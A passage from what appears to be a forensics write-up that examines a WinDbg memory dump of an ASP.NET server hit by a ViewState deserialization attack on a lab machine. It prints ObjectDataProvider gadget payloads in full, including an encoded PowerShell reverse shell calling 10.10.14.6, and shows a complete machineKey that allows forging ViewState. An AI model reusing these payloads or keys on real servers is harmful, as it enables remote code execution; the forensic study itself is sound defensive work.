  0028  _deferLevel               : 0 (System.Int32)
  002c  _isInitialLoadEnabled     : False (System.Boolean)
  002d  _initialLoadCalled        : True (System.Boolean)
  002e  _isAsynchronous           : False (System.Boolean)
  002f  _needNewInstance          : True (System.Boolean)
  0030  _objectType               : 0000020da75743d0 System.Diagnostics.Process (System.RuntimeType)
  0038  _objectInstance           : 0000020ea6f23200 (System.Diagnostics.Process)
  0040  _methodName               : 0000020ea6f20448  "Start" [5] (System.String)
  0048  _instanceProvider         : NULL
  0050  _constructorParameters    : 0000020ea6f21fc8 (MS.Internal.Data.ParameterCollection)
  0058  _methodParameters         : 0000020ea6f22060 (MS.Internal.Data.ParameterCollection)
  0060  _sourceDataChangedHandler : 0000020ea6f220b8 (System.EventHandler)
  0068  _mode                     : FromInstance (2) (System.Windows.Data.ObjectDataProvider+SourceMode)
--------------------------------------------------------------------------------
2 objects found.
```

The **`System.Diagnostics.Process`** object at **`0x0000020da757b090`** represents a process. This is a class for managing and interacting with system processes. 

```
0:000> !mex.DisplayObj 0x0000020da757b090
0x0000020da757b090 System.Diagnostics.Process
[statics]
  0000  __identity               : NULL
  0008  site                     : NULL
  0010  events                   : NULL
  0018  m_processHandle          : 0000020da7594750 (Microsoft.Win32.SafeHandles.SafeProcessHandle)
  0020  machineName              : 0000020da7257ae8  "." [1] (System.String)
  0028  processInfo              : NULL
  0030  threads                  : NULL
  0038  modules                  : NULL
  0040  mainWindowTitle          : NULL
  0048  startInfo                : 0000020da758c3a8 (System.Diagnostics.ProcessStartInfo)
  0050  onExited                 : NULL
  0058  registeredWaitHandle     : NULL
  0060  waitHandle               : NULL
  0068  synchronizingObject      : NULL
  0070  standardOutput           : NULL
  0078  standardInput            : NULL
  0080  standardError            : NULL
  0088  operatingSystem          : NULL
  0090  OutputDataReceived       : NULL
  0098  ErrorDataReceived        : NULL
  00a0  output                   : NULL
  00a8  error                    : NULL
  00b0  mainWindowHandle         : 0000000000000000 (System.IntPtr)
  00b8  minWorkingSet            : 0000000000000000 (System.IntPtr)
  00c0  maxWorkingSet            : 0000000000000000 (System.IntPtr)
  00c8  processorAffinity        : 0000000000000000 (System.IntPtr)
  00d0  processId                : 0 (System.Int32)
  00d4  m_processAccess          : 2035711 (System.Int32)
  00d8  priorityClass            : 0 (System.Diagnostics.ProcessPriorityClass)
  00dc  exitCode                 : 0 (System.Int32)
  00e0  outputStreamReadMode     : undefined (0) (System.Diagnostics.Process+StreamReadMode)
  00e4  errorStreamReadMode      : undefined (0) (System.Diagnostics.Process+StreamReadMode)
  00e8  haveProcessId            : False (System.Boolean)
  00e9  haveProcessHandle        : True (System.Boolean)
  00ea  isRemoteMachine          : False (System.Boolean)
  00eb  haveMainWindow           : False (System.Boolean)
  00ec  haveWorkingSetLimits     : False (System.Boolean)
  00ed  haveProcessorAffinity    : False (System.Boolean)
  00ee  havePriorityClass        : False (System.Boolean)
  00ef  watchForExit             : False (System.Boolean)
  00f0  watchingForExit          : False (System.Boolean)
  00f1  exited                   : False (System.Boolean)
  00f2  signaled                 : False (System.Boolean)
  00f3  haveExitTime             : False (System.Boolean)
  00f4  responding               : False (System.Boolean)
  00f5  haveResponding           : False (System.Boolean)
  00f6  priorityBoostEnabled     : False (System.Boolean)
  00f7  havePriorityBoostEnabled : False (System.Boolean)
  00f8  raisedOnExited           : False (System.Boolean)
  00f9  disposed                 : False (System.Boolean)
  00fa  pendingOutputRead        : False (System.Boolean)
  00fb  pendingErrorRead         : False (System.Boolean)
  0100  exitTime                 : 0000020da757b198 1/1/0001 12:00:00 AM (System.DateTime)
```

The **`startInfo`** field in the **`System.Diagnostics.Process`** object holds an instance of **`System.Diagnostics.ProcessStartInfo`** configured to start the cmd.exe with the arguments **`/c ping 10.10.14.6`**. 

```
0:000> !mex.DisplayObj 0x0000020da758c3a8
0x0000020da758c3a8 System.Diagnostics.ProcessStartInfo
  0000  fileName                : 0000020da7589078  "cmd" [3] (System.String)
  0008  arguments               : 0000020da7586fd8  "/c ping 10.10.14.6" [18] (System.String)
  0010  directory               : NULL
  0018  verb                    : NULL
  0020  userName                : 0000020da6d71420  "" [0] (System.String)
  0028  domain                  : 0000020da6d71420  "" [0] (System.String)
  0030  password                : NULL
  0038  passwordInClearText     : NULL
  0040  standardOutputEncoding  : NULL
  0048  standardErrorEncoding   : NULL
  0050  weakParentProcess       : NULL
  0058  environmentVariables    : NULL
  0060  environment             : NULL
  0068  errorDialogParentHandle : 0000000000000000 (System.IntPtr)
  0070  windowStyle             : Normal (0) (System.Diagnostics.ProcessWindowStyle)
  0074  errorDialog             : False (System.Boolean)
  0075  useShellExecute         : True (System.Boolean)
  0076  loadUserProfile         : False (System.Boolean)
  0077  redirectStandardInput   : False (System.Boolean)
  0078  redirectStandardOutput  : False (System.Boolean)
  0079  redirectStandardError   : False (System.Boolean)
  007a  createNoWindow          : False (System.Boolean)
```

The **`!ForEachObject -s -x "!do2 @#Obj" System.Diagnostics.ProcessStartInfo`** command in WinDbg iterates over all instances of the **`System.Diagnostics.ProcessStartInfo`** class in memory and executes the **`!do2`** command on each instance.

The **`arguments`** field in the **`System.Diagnostics.ProcessStartInfo`** object specifies the command-line arguments that are passed to the executable when the process is started.

```
0:000> !ForEachObject -s -x "!do2 @#Obj" System.Diagnostics.ProcessStartInfo
0x0000020da758c3a8 System.Diagnostics.ProcessStartInfo
  0000  fileName                : 0000020da7589078  "cmd" [3] (System.String)
  0008  arguments               : 0000020da7586fd8  "/c ping 10.10.14.6" [18] (System.String)
  0010  directory               : NULL
  0018  verb                    : NULL
  0020  userName                : 0000020da6d71420  "" [0] (System.String)
  0028  domain                  : 0000020da6d71420  "" [0] (System.String)
  0030  password                : NULL
  0038  passwordInClearText     : NULL
  0040  standardOutputEncoding  : NULL
  0048  standardErrorEncoding   : NULL
  0050  weakParentProcess       : NULL
  0058  environmentVariables    : NULL
  0060  environment             : NULL
  0068  errorDialogParentHandle : 0000000000000000 (System.IntPtr)
  0070  windowStyle             : Normal (0) (System.Diagnostics.ProcessWindowStyle)
  0074  errorDialog             : False (System.Boolean)
  0075  useShellExecute         : True (System.Boolean)
  0076  loadUserProfile         : False (System.Boolean)
  0077  redirectStandardInput   : False (System.Boolean)
  0078  redirectStandardOutput  : False (System.Boolean)
  0079  redirectStandardError   : False (System.Boolean)
  007a  createNoWindow          : False (System.Boolean)
--------------------------------------------------------------------------------
0x0000020ea6f286f0 System.Diagnostics.ProcessStartInfo
  0000  fileName                : 0000020ea6f281f0  "cmd" [3] (System.String)
  0008  arguments               : 0000020ea6f26440  "/c powershell -e JABjAGwAaQBlAG4AdAAgAD0..." [1345] (System.String)
  0010  directory               : NULL
  0018  verb                    : NULL
  0020  userName                : 0000020da6d71420  "" [0] (System.String)
  0028  domain                  : 0000020da6d71420  "" [0] (System.String)
  0030  password                : NULL
  0038  passwordInClearText     : NULL
  0040  standardOutputEncoding  : NULL
  0048  standardErrorEncoding   : NULL
  0050  weakParentProcess       : NULL
  0058  environmentVariables    : NULL
  0060  environment             : NULL
  0068  errorDialogParentHandle : 0000000000000000 (System.IntPtr)
  0070  windowStyle             : Normal (0) (System.Diagnostics.ProcessWindowStyle)
  0074  errorDialog             : False (System.Boolean)
  0075  useShellExecute         : True (System.Boolean)
  0076  loadUserProfile         : False (System.Boolean)
  0077  redirectStandardInput   : False (System.Boolean)
  0078  redirectStandardOutput  : False (System.Boolean)
  0079  redirectStandardError   : False (System.Boolean)
  007a  createNoWindow          : False (System.Boolean)
--------------------------------------------------------------------------------
2 objects found.
```

As discussed previously, **`System.Windows.Data.ObjectDataProvider`** is a class that allows you to create and bind to an object, or call a method of an object, in **XAML**. 

We can use the **SOSEX** extension that has been created by **Steve Johnson**. The **SOSEX** extension is designed to enhance the analysis and troubleshooting of .NET applications. We can use the **`!sosex.strings`** to search for strings in a .NET application's managed heap.

```
0:000> !sosex.strings /m:*ObjectDataProvider*"
Address            Gen  Value
---------------------------------------
0000020da750a8d0            0   <?xml version="1.0" encoding="utf-16"?>
<ObjectDataProvider MethodName="Start" IsInitialLoadEnabled="False" xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:sd="clr-namespace:System.Diagnostics;assembly=System" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml">
  <ObjectDataProvider.ObjectInstance>
    <sd:Process>
      <sd:Process.StartInfo>
        <sd:ProcessStartInfo Arguments="/c ping 10.10.14.6" StandardErrorEncoding="{x:Null}" StandardOutputEncoding="{x:Null}" UserName="" Password="{x:Null}" Domain="" LoadUserProfile="False" FileName="cmd" />
      </sd:Process.StartInfo>
    </sd:Process>
  </ObjectDataProvider.ObjectInstance>
</ObjectDataProvider>
0000020da7558188            0   ObjectDataProviderExtension
0000020da75581d8            0   System.Windows.Automation.ObjectDataProvider
0000020da7558250            0   System.Windows.Media.TextFormatting.ObjectDataProvider
0000020da75582d8            0   System.Windows.Ink.ObjectDataProvider
0000020da7558340            0   System.Windows.Input.ObjectDataProvider
0000020da75583a8            0   System.Windows.Media.Effects.ObjectDataProvider
0000020da7558420            0   System.Windows.Media.Imaging.ObjectDataProvider
0000020da7558498            0   System.Windows.Media.Media3D.ObjectDataProvider
0000020da7558510            0   System.Windows.Media.Animation.ObjectDataProvider
0000020da7558590            0   System.Windows.Media.ObjectDataProvider
0000020da75585f8            0   System.Windows.ObjectDataProvider
0000020da7558658            0   System.Windows.ObjectDataProvider
0000020da75586b8            0   System.Windows.Input.ObjectDataProvider
0000020da7558720            0   System.Windows.Media.ObjectDataProvider
0000020da7558788            0   System.Diagnostics.ObjectDataProvider
0000020da75587f0            0   System.Windows.Controls.ObjectDataProvider
0000020da7558860            0   System.Windows.Documents.ObjectDataProvider
0000020da75588d0            0   System.Windows.Shapes.ObjectDataProvider
0000020da7558940            0   System.Windows.Shell.ObjectDataProvider
0000020da75589a8            0   System.Windows.Navigation.ObjectDataProvider
0000020da7558a20            0   System.Windows.Data.ObjectDataProvider
0000020da7563500            0   ObjectDataProvider.ObjectInstance
0000020da75636d8            0   ObjectDataProviderExtension
0000020da7593148            0   ObjectDataProviderHasNoSource
0000020da7593430            0   ObjectDataProviderNonCLSExceptionInvoke
0000020da7595140            0   Unable to cast object of type 'System.Windows.Data.ObjectDataProvider' to type 'System.Windows.Media.Brush'.
0000020ea6f19828            0   <?xml version="1.0" encoding="utf-16"?>
<ObjectDataProvider MethodName="Start" IsInitialLoadEnabled="False" xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:sd="clr-namespace:System.Diagnostics;assembly=System" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml">
  <ObjectDataProvider.ObjectInstance>
    <sd:Process>
      <sd:Process.StartInfo>
        <sd:ProcessStartInfo Arguments="/c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANgAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA" StandardErrorEncoding="{x:Null}" StandardOutputEncoding="{x:Null}" UserName="" Password="{x:Null}" Domain="" LoadUserProfile="False" FileName="cmd" />
      </sd:Process.StartInfo>
    </sd:Process>
  </ObjectDataProvider.ObjectInstance>
</ObjectDataProvider>
0000020ea6f1fa18            0   ObjectDataProviderExtension
0000020ea6f207b0            0   ObjectDataProvider.ObjectInstance
0000020ea6f20988            0   ObjectDataProviderExtension
0000020ea6f29ec0            0   Unable to cast object of type 'System.Windows.Data.ObjectDataProvider' to type 'System.Windows.Media.Brush'.
---------------------------------------
32 matching strings
```

The first output shows a malicious ViewState payload that uses **`System.Windows.Data.ObjectDataProvider`** to execute a command. It executes a **`ping`** command to check the connectivity to the IP address 10.10.14.6

```
0:000> !do2 0000020da750a8d0 
[raw] 0000020da750a8d0 "<?xml version="1.0" encoding="utf-16"?>
<ObjectDataProvider MethodName="Start" IsInitialLoadEnabled="False" xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:sd="clr-namespace:System.Diagnostics;assembly=System" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml">
  <ObjectDataProvider.ObjectInstance>
    <sd:Process>
      <sd:Process.StartInfo>
        <sd:ProcessStartInfo Arguments="/c ping 10.10.14.6" StandardErrorEncoding="{x:Null}" StandardOutputEncoding="{x:Null}" UserName="" Password="{x:Null}" Domain="" LoadUserProfile="False" FileName="cmd" />
      </sd:Process.StartInfo>
    </sd:Process>
  </ObjectDataProvider.ObjectInstance>
</ObjectDataProvider>"
```

The second output shows a malicious ViewState payload that uses **`System.Windows.Data.ObjectDataProvider`** to execute a command. This payload is configured to run a PowerShell command that is base64-encoded, which is a reverse shell.

```
0:000> !do2 0000020ea6f19828 
[raw] 0000020ea6f19828 "<?xml version="1.0" encoding="utf-16"?>
<ObjectDataProvider MethodName="Start" IsInitialLoadEnabled="False" xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:sd="clr-namespace:System.Diagnostics;assembly=System" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml">
  <ObjectDataProvider.ObjectInstance>
    <sd:Process>
      <sd:Process.StartInfo>
        <sd:ProcessStartInfo Arguments="/c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANgAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA" StandardErrorEncoding="{x:Null}" StandardOutputEncoding="{x:Null}" UserName="" Password="{x:Null}" Domain="" LoadUserProfile="False" FileName="cmd" />
      </sd:Process.StartInfo>
    </sd:Process>
  </ObjectDataProvider.ObjectInstance>
</ObjectDataProvider>"
```

The **`!netext.wconfig`** command is used to dump the content of .config files loaded in memory. It provides information about each configuration setting, including the key, definition path, file name, line number, and raw XML content. From this command, we could see the information that is stored within the **web.config** file, which contains the ASP.NET MachineKey.

```
0:000> !netext.wconfig

<<< SNIPPET >>>

<httpRuntime targetFramework="4.5" />
<--
Key: system.web/machineKey
Definition Config Path: machine/webroot/2
Filename: C:\inetpub\wwwroot\dev\web.config
Line: 0n5
 -->

<machineKey decryption="AES" decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" validation="SHA1" validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" />
<--
Key: system.webServer
Definition Config Path: machine/webroot/2
Filename: C:\inetpub\wwwroot\dev\web.config
Line: 0n7
 -->

<system.webServer>
        <httpErrors>
            <remove statusCode="403" subStatusCode="-1" />
            <error statusCode="403" prefixLanguageFilePath="" path="http://dev.pov.htb:8080/portfolio" responseMode="Redirect" />
        </httpErrors>
        <httpRedirect enabled="true" destination="http://dev.pov.htb/portfolio" exactDestination="false" childOnly="true" />
    </system.webServer>
```

The above information is derived from **`System.Configuration.SectionXmlInfo`**, whis an internal class used to represent the XML content and metadata of a configuration section. The **`_rawXml`** field in the **`System.Configuration.SectionXmlInfo`** class holds the raw XML string of a configuration section. 

```
0:000> !mex.grep -r "system.web/machineKey" -A 15 !ForEachObject -s -x "!do2 @#Obj" System.Configuration.SectionXmlInfo 
  0000  _configKey                 : 0000020da6dafe38  "system.web/machineKey" [21] (System.String)
  0008  _definitionConfigPath      : 0000020da6e07460  "machine/webroot/2" [17] (System.String)
  0010  _targetConfigPath          : 0000020da6e07460  "machine/webroot/2" [17] (System.String)
  0018  _subPath                   : NULL
  0020  _filename                  : 0000020da6e07738  "C:\inetpub\wwwroot\dev\web.config" [33] (System.String)
  0028  _streamVersion             : 0000020da6e078b0 (System.Configuration.Internal.FileVersion)
  0030  _configSource              : NULL
  0038  _configSourceStreamName    : NULL
  0040  _configSourceStreamVersion : NULL
  0048  _rawXml                    : 0000020da6e0b348  "<machineKey decryption="AES" decryptionK..." [275] (System.String)
  0050  _configBuilderName         : NULL
  0058  _protectionProviderName    : NULL
  0060  _lineNumber                : 5 (System.Int32)
  0064  _skipInChildApps           : False (System.Boolean)
  0068  _overrideMode              : 0000020da6e0b660 (System.Configuration.OverrideModeSetting)
--------------------------------------------------------------------------------
  0000  _configKey                 : 0000020da6f4da98  "system.web/machineKey" [21] (System.String)
  0008  _definitionConfigPath      : 0000020da6fa96f0  "machine/webroot/2" [17] (System.String)
  0010  _targetConfigPath          : 0000020da6fa96f0  "machine/webroot/2" [17] (System.String)
  0018  _subPath                   : NULL
  0020  _filename                  : 0000020da6fa9970  "C:\inetpub\wwwroot\dev\web.config" [33] (System.String)
  0028  _streamVersion             : 0000020da6fa9ae8 (System.Configuration.Internal.FileVersion)
  0030  _configSource              : NULL
  0038  _configSourceStreamName    : NULL
  0040  _configSourceStreamVersion : NULL
  0048  _rawXml                    : NULL
  0050  _configBuilderName         : NULL
  0058  _protectionProviderName    : NULL
  0060  _lineNumber                : 5 (System.Int32)
  0064  _skipInChildApps           : False (System.Boolean)
  0068  _overrideMode              : 0000020da6faed60 (System.Configuration.OverrideModeSetting)
--------------------------------------------------------------------------------
```

The output shows the raw XML string for the machineKey configuration section.  The **`machineKey`** section specifies cryptographic keys used for encrypting and validating data, such as ViewState in ASP.NET applications. The cryptographic keys that we can see from this data matches with the one's that is discussed within this blogpost: https://0xdf.gitlab.io/2024/06/08/htb-pov.html

```
0:000> !mex.DisplayObj 0x0000020da6e0b348
[raw] 0000020da6e0b348 "<machineKey decryption="AES" decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" validation="SHA1" validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" />"
```

Let's get back to all the HTTP requests and look at the **302** status code. A **302** status code, also known as "Found" or "Moved Temporarily" is an HTTP response status code indicating that the requested resource has been temporarily moved to a different URL. 

```
0:000> !mex.grep -r /portfolio/default.aspx !netext.wfrom -nospace -nofield -type *.HttpContext select $rpad($addr(),10), " ", $if(!_thread, " --", $lpad($thread(_thread.DONT_USE_InternalThread),4)), " ", $tickstodatetime(_utcTimestamp.dateData), " ", $if((_timeoutSet==1),$tickstotimespan(_timeout._ticks), "Not set "), " ", $if(_response._completed || _finishPipelineRequestCalled,"Finished", $tickstotimespan($now()-_utcTimestamp.dateData)), " ", $replace($lpad(_response._statusCode,8), "0n","")," ", $rpad($isnull(_request._httpMethod,"NA"),8), " ", $isnull(_request._url.m_String, _request._filePath._virtualPath)
0000020DA70834C0  -- 6/9/2024 7:28:33 PM 00:00:00 Finished    200 GET      /portfolio/default.aspx
0000020DA741BFA8  -- 6/9/2024 7:28:39 PM 00:00:00 Finished    200 POST     /portfolio/default.aspx
0000020DA7435768  -- 6/9/2024 7:29:02 PM 00:00:00 Finished    302 POST     /portfolio/default.aspx
0000020DA744D0A0  -- 6/9/2024 7:29:14 PM 00:00:00 Finished    200 POST     /portfolio/default.aspx
0000020DA746D8A0  -- 6/9/2024 7:29:26 PM 00:00:00 Finished    200 POST     /portfolio/default.aspx
0000020DA749A6D8  -- 6/9/2024 7:30:08 PM 00:00:00 Finished    200 POST     /portfolio/default.aspx
0000020DA74BA870  -- 6/9/2024 7:30:40 PM 00:00:00 Finished    200 POST     /portfolio/default.aspx
0000020DA74D6168  -- 6/9/2024 7:31:13 PM 00:00:00 Finished    302 POST     /portfolio/default.aspx
0000020EA6E79750  -- 6/9/2024 7:28:55 PM 00:00:00 Finished    302 POST     /portfolio/default.aspx
0000020EA6EB2A98  -- 6/9/2024 7:29:18 PM 00:00:00 Finished    200 POST     /portfolio/default.aspx
0000020EA6EC32E0  -- 6/9/2024 7:30:16 PM 00:00:00 Finished    200 POST     /portfolio/default.aspx
0000020EA6ED8160  -- 6/9/2024 7:30:54 PM 00:00:00 Finished    200 POST     /portfolio/default.aspx
0000020EA6EF18F0  -- 6/9/2024 7:31:49 PM 00:00:00 Finished    302 POST     /portfolio/default.aspx
```

From a DFIR point of view, sometimes an attacker could make mistakes as well. This would lead to artifacts on disks. In this case, we're going to inspect the following memory address **`0000020DA74D6168`** that has an **invalid ViewState**. As we can see from the results, it has a **302** status code. I'm not going to repeat the exact same steps again on how to identify the ViewState. 

```
0:000> !mex.DisplayObj 0x0000020da74e0308
[raw] 0000020da74e0308 System.Web.HttpValueCollection Entries: 6
Name                 Value
==================== ========================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================
__EVENTTARGET        download
__EVENTARGUMENT      
__VIEWSTATE          prSDlekDxsPCc/rFoMPPcZtsiGjJxbfNS8TDzRAol3FbIEaHaq49D89ZymK3x8s3AZ1rhuJEaUDJlGu6sfxmq7OtIYQaRtmwoHKWcssLsRVl+WG0LkBLBvTQ3hQ+EEraVu5wMY0MPZmLw+oVO7QBLFTLn8tc5334VRNJdh4tTlDl75K6fu1tZuFx3tXW3ZfkmMkpj+BTs8BIZOhelwlYLw9C6xvJp0HPOEr9rBhE/7721nVZLcszHzeIL5RsydnAamEuUbvX/uYMR05EUMVYkO9JIsHisGHqdd+JaBRK+uI+ch3E5m7zdeJoW81sbKfo+Cc3+IGKjtLQl/qypRLsm4iH4vcru+9EJkLsrKdaOppKzuD/SE8pVHfbtl+jEafCHU36FAwRX6qD9bUrJdaTkpYWjJngTHm1jULJdSh65GkSELCH5WCNmTFR7UJGYzr/DkfAcnwOmb0RFijrMBpwGkiBeJQuzNEw8dC9BOdBj6/HuPbARqiMn+aXQRqNgw8GrOAWrd2PW6Er+ml7JSxDz8CszbYwDixgDVnQTOnCcO8WoJtH0DEdQDrBBTiUDEZgWZAu37JFyNwnig+6QknHGudoA3uKlZZtYRm7Dd1yascID5n/2RuSgTP/QPPp/2SuX423kakr/DivpUFFHh0Jbfj2ibSQhFbnYNQRszovwescUVcTzFbJsO1LMjDtMKlZqXqWjmUJD/YZeOMPWSCTIXDOSnJdihQSqjfQ5YdlWcjY+PE4Cl0CAX9CNFgy9iKdz6QbgT8uFOIq2JWhN2zxcO3lXRRjl5sW6X6UNPo/Jof0cxmYR4SbTGnAXrFGMC/hMMFZh++w+d6BkyrpXgwwiM0GBe6v5L5yjOXLH7Kr1nxOw0KVXwl13cNErHU7k7jQ6r7yMgdvs7pGsiNTg7aWuuTW7QL9SJTHHp+/oCwglvuuHGGp6XATRdippj/Yzda39FyVDBBNmXGjx87gSs4Evai5Q/JJgbv53OA1Y38zPgwAfr5feM9uN2k8zrAAWWuzMnjeEOK4Jpe9Q9L6m3H+mVRIH+mb58/j3Y8nv4mnMsdRqEy2F9RchTBg+P6aAMSfCiiOv8pfjigBbAGPdBtgI9larZwAdiHfcSAWzLG2Uvp4hNm7uDbLnuTL0UQGH3A6Hu6H6Z6t0bc3PM4/uh36FwSbz56C6sOLls03UeN5OrYtKIDpbX/AaPaz459c8dZdhKBNB61pQmilGpgPYTuM1CaPi0BqrPprHIq5N1HQOuu7tyUa9JiI342ESON2Sx1w4J9XFpNR4kjsW9MA+kuFbwUcx9vnrqFgd9tmw1voZhhqI9GRndruaRMrPZ4G1tj1UHthEa0sN74xb0kOCjJ4XP7TmKcbtQ8rPi0OAe4CkuB3kbabROFuJnzZLC+VLlHsr4fr4jeyz/tI/4xmBjFd5jyi1w1gsYTyYNDkzM/39V/Ty90SORsZBwdyHej5laRRA2bRxIeHBrdhJ8VS1p9IMyl3TzmaOPbGS3DARJwipikx/Ny9c1EpD7QvJXtShkuYz0O1wuMlitmnmFyvahlcC/gqF5LX7TzAoiC2GR5s8v5WL6A0SeTbr9oONIQ5zFYTvcvv2fyRTQIQ8AbdJWObzHxbxC3xPkbgN0NBlla9MqhdHRJKnHznPg0/n9nwVx1PFPE+1KDn3KKvZu1v7HgamwiM2c5PfunuR9fCAwsL2YSYkDXa4gZcfdnnwUM1h2NgwGIKoyMaQtOG36xv54HMH1imCvCCPy6Or2uSpuxcv1vSmsW06xF2U4i6+Oy71Oc7B5DaQwI2Tk7GqTcoIIty+WHptR8p4pJRZGgNYliWiJrRlvlSlt0NSuSHCkQ32o71NH1VVg==
__VIEWSTATEGENERATOR 8E0F0FA3
__EVENTVALIDATION    PJQCREUo0khpECgXqIUAKspvizBGfLAW/qc5I85PBkb2p8lQwzO8DDS/4HqGblZJ3xC7USh9PyfG9mTKhe4E9qWnaXtQSDSBEp/g4KFMytV0fuiutV4uWhUIRpipDsIPUVUBqw==
file                 \web.config
```

In the **Event Viewer** at the **Application** logs, we are able to see that there is an Event ID **1316** with the message *Viewstate verification failed. Reason: Viewstate was invalid.*. The event log includes the relevant PID, and so on. This could be a relevant indicator during an investigation that an attempt was made to craft a malicious ViewState. However, keep in mind that this means an attacker would need to make a mistake to generate this log entry.

![image](https://github.com/DebugPrivilege/InsightEngineering/assets/63166600/7e5b188b-1a76-4e3e-9a48-bc3aeea6f722)


This is the **invalid ViewState**, which matches exactly with the one we can see in our memory dump:

![image](https://github.com/DebugPrivilege/InsightEngineering/assets/63166600/be941d41-7027-46a2-8b75-f6deaab109a4)


# References

